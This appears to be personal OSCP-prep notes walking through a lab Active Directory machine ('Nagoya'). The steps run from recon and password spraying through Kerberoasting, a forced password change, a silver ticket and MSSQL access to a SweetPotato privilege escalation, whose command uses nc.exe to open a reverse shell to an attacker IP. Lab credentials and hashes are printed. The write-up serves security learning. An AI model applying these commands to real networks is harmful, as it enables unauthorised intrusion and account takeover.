@@ -1,0 +1,328 @@
+**Start 16:06 15-05-2025**
+
+---
+```
+Scope:
+192.168.169.21
+```
+# Recon
+
+## Nmap
+
+```bash
+PORT      STATE SERVICE           REASON  VERSION
+53/tcp    open  domain            syn-ack Simple DNS Plus
+80/tcp    open  http              syn-ack Microsoft IIS httpd 10.0
+|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Nagoya Industries - Nagoya
+88/tcp    open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2025-05-15 14:08:14Z)
+135/tcp   open  msrpc             syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?     syn-ack
+464/tcp   open  kpasswd5?         syn-ack
+593/tcp   open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?          syn-ack
+3268/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl? syn-ack
+3389/tcp  open  ms-wbt-server     syn-ack Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: NAGOYA-IND
+|   NetBIOS_Domain_Name: NAGOYA-IND
+|   NetBIOS_Computer_Name: NAGOYA
+|   DNS_Domain_Name: nagoya-industries.com
+|   DNS_Computer_Name: nagoya.nagoya-industries.com
+|   DNS_Tree_Name: nagoya-industries.com
+|   Product_Version: 10.0.17763
+5985/tcp  open  http              syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf            syn-ack .NET Message Framing
+49666/tcp open  msrpc             syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc             syn-ack Microsoft Windows RPC
+49676/tcp open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc             syn-ack Microsoft Windows RPC
+49681/tcp open  msrpc             syn-ack Microsoft Windows RPC
+49691/tcp open  msrpc             syn-ack Microsoft Windows RPC
+49698/tcp open  msrpc             syn-ack Microsoft Windows RPC
+49717/tcp open  msrpc             syn-ack Microsoft Windows RPC
+```
+
+## 80/TCP - HTTP
+
+![](../../../assets/dd244477f492744872dbba9b503185e1.png)
+
+We then check the `/Team` tab and notice an absolutely enormous list of possible users.
+
+![](../../../assets/a7f8a1093494224d927dd55e0fa35046.png)
+
+Furthermore I only found one more endpoint:
+
+![](../../../assets/cfddab30d48407dee927d2de6ea1ef38.png)
+
+### Making Wordlists
+
+Either way I went ahead and put all the team members inside a `team.txt` file, then used `username-anarchy` to create potential usernames out of it, after which I used `kerbrute` to verify the existing usernames on the domain:
+
+![](../../../assets/7ffacd9fe5139fa44434a9e65bfc34b6.png)
+
+I then used the following command to overwrite my original `users.txt` file with only the valid accounts:
+
+![](../../../assets/baaf09a7fd81da93795c82db8c8efe61.png)
+
+Now that we have a wordlist of usernames we need to make a wordlist of passwords, only natural right?
+
+>[!info]
+>Yeah not gonna lie I was never gonna guess this one but [this walkthrough helped me](https://medium.com/@carlosbudiman/oscp-proving-grounds-nagoya-hard-active-directory-bd548b5a740d):
+>![](../../../assets/3a3155f6f75c7949d38f9d75b7ae7e6f.png)
+
+![](../../../assets/1d30913ecbf0d5a9998ec4acb4f5e412.png)
+
+Guess that's some *REAL* outside of the box thinking here.
+
+## Password Spraying
+
+Now that we had a set of matching creds we could go ahead and start spraying the creds to see what's up.
+
+![](../../../assets/a4acb0c8b678a7899def2a0433bf0db1.png)
+
+Well that settles that let's check out the SMB shares as well as RDP in.
+
+## 445/TCP - SMB
+
+![](../../../assets/6159760e0ab76d84202f7623336219bc.png)
+
+![](../../../assets/3d0776edbcc9c0cbdf492776c2208e80.png)
+
+I ended up getting them all and checking them out.
+
+![](../../../assets/a68c8e68e0bc02a845c3a3f16e2c514a.png)
+
+### Reverse Engineering
+
+Obviously we aren't able to read the other files using `cat` since they're `.exe` and `.dll` files, so instead we use the `strings` command:
+
+![](../../../assets/0652931b6dd773d3bb8e9bc9edec8c4c.png)
+
+Well look at that we found another user!
+
+```
+svc_helpdesk
+U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
+```
+
+## Kerberoasting
+
+I now had another valid set of creds so I could kerberoast sine creds:
+
+![](../../../assets/69bc61a1d6c72b54116f3b41a60c6c1c.png)
+
+From this I was able to gather the `svc_mssql` user.
+
+We can now go on to crack the hashes using `john`:
+
+![](../../../assets/30e38a672c3723b4befe9bb75c4cd7ae.png)
+
+```
+svc_mssql
+Service1
+```
+
+# BloodHound
+## Set Up
+
+![](../../../assets/d31ff02b802aba12c4990802b6aa945c.png)
+
+I use the above and find a bunch of data which I can now ingest in my browser:
+
+![](../../../assets/61210569023adcd73616579ea4045f60.png)
+
+Once ingested I go ahead and get everything organized, let's see who we need to reach and how.
+
+![](../../../assets/0aa53ddb8c68b7120bc5cc20918ee91a.png)
+
+From here we see only one user that has access to interesting groups:
+
+![](../../../assets/66c61e968258e23c31fe70102f28dee3.png)
+
+I check out the options of abuse here:
+
+![](../../../assets/1ce8fdada3f84af53b94f2f930981f82.png)
+
+I end up choosing the **Force Change Password** method and see if it hopefully works:
+
+```bash
+net rpc password "christopher.lewis" "Pass@123" -U 'nagoya-industries.com'/'svc_helpdesk'%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.169.21"
+```
+
+![](../../../assets/508c4be68e649a67e334e92b17b98844.png)
+
+>[!success]
+>Well shit it seemed to work!
+
+# Foothold
+## Shell as Christopher
+
+![](../../../assets/8673dffd8e64c9166f352cb4e892440f.png)
+
+We now finally had access and could start the rest of our enumeration process.
+
+![](../../../assets/079e2a8b7bbfb732d7c850a444523d39.png)
+
+Shit.
+
+### local.txt
+
+![](../../../assets/369620d4deef78ddcdb73e212eb48f43.png)
+
+That's a first? 
+
+>[!warning]
+>It was here that I was getting stuck because I didn't know what to do next, I tried the `mssql` RCE approach but that didn't work.
+
+## Silver Ticket
+
+>[!note]
+>Since I've never done this before I heavily checked a walkthrough here.
+
+The premise would look like this:
+
+![](../../../assets/3dbbae0b2dfca4015dd6b88624882998.png)
+
+To do this we need the following:
+
+- SPN password hash,  
+- Domain SID,  
+- and Target SPN of the service account you’ve compromised
+
+### Domain SID
+
+![](../../../assets/69eb8eb24cd9fe7591cf6044390d5346.png)
+
+```
+S-1-5-21-1969309164-1513403977-1686805993
+```
+
+### SPN Password Hash
+
+![](../../../assets/5bd45133e65aff4543d5b9e0a951a2fa.png)
+
+```
+E3A0168BC21CFB88B95C954A5B18F57C
+```
+
+### Target SPN service account
+
+![](../../../assets/b3ce261da0dd3f99af044b4bafa88f3f.png)
+
+```
+MSSQL/nagoya.nagoya-industries.com
+```
+
+### Putting it all Together
+
+![](../../../assets/46e3f18348a474ef2bfa13efa3b36d7c.png)
+
+We check if it is stashed correctly using `klist`:
+
+![](../../../assets/49f6667ae25ec1649d799525853e3f0b.png)
+
+We will then issue the following command:
+
+```bash
+export KRB5CCNAME=$PWD/Administrator.ccache
+```
+
+And now create this file:
+
+```bash
+# /etc/krb5user.conf
+[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+    rdns = false
+    dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]
+        NAGOYA-INDUSTRIES.COM = {
+                kdc = nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+```
+
+![](../../../assets/ffbe6517ba035c82dfc244d5d392ac21.png)
+
+Once that is done we can move on to port forwarding and gaining access via `mssql`.
+
+## Port Forward
+
+This is the easy part:
+
+![](../../../assets/b33a9c2b38ee5dcaec11e47cf7386f20.png)
+
+![](../../../assets/502509fae5a9f25a133b3f5e2607929e.png)
+
+![](../../../assets/8d5b7e3f7ca982f8c6c28c43c91cc897.png)
+
+Once we've set all the above we can access the `mssql` client via the port forward IP `240.0.0.1`:
+
+## MSSQL
+
+In order to gain access as *Admin* to the port forwarded `mssql` client we need to add the host to `/etc/hosts`:
+
+![](../../../assets/71419386374b11c5d1c710f076393099.png)
+
+Now we can access it on the port forward address.
+
+![](../../../assets/088f0e2123602f8cd9c4288f987ac04c.png)
+
+>[!important]
+>Be sure to access it via the same terminal window where you cached the ticket!
+
+![](../../../assets/3780b558bf3774885074db97bbbf23a9.png)
+
+And now we can execute arbitrary commands such as a reverse shell!
+
+![](../../../assets/c478212cb26323b55979e1629a39eda9.png)
+
+# Privilege Escalation
+## SeImpersonatePrivilege
+
+This was pretty simple (at last):
+
+![](../../../assets/7a10d7fa87471487afad3e28a6b8fc15.png)
+
+We just need to spam potatoes until one of em works.
+
+I used `SweetPotato` here with the following command using `nc.exe`:
+
+```bash
+./sweet.exe -p PrintSpoofer -p nc.exe -a '192.168.45.154 8000 -e cmd'
+```
+
+![](../../../assets/44bfa15ce5ed0ddf101538c1b0893e58.png)
+
+![](../../../assets/16830d97bc55eaab9f4b7b2be20aba3a.png)
+
+From here it was piece of cake
+
+### proof.txt
+
+![](../../../assets/3e7331c3ba0a01e9e001e8fd530278da.png)
+
+---
+
+**Finished 08:41 16-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#ActiveDirectory #enumeration #Out-Of-The-Box #kerberoasting #SilverTicket #ReverseEngineering #BloodHound #Ligolo #impacket 
